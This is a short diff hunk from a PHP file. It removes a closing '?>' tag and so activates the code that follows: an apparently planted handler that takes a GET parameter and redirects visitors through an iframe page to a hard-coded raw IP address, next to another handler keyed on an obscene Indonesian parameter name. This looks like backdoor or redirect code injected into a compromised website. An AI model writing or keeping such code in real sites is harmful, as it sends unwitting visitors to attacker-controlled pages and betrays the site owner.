@@ -19,7 +19,6 @@ if(isset($_GET['ngentot'])) {
 } else {
  
 }
-?>
 if(isset($_GET['rr-op'])) {
   $url = $_GET['rr-op'];
   header('location:iframe.php?url=https://65.108.132.145/'.$url.'');
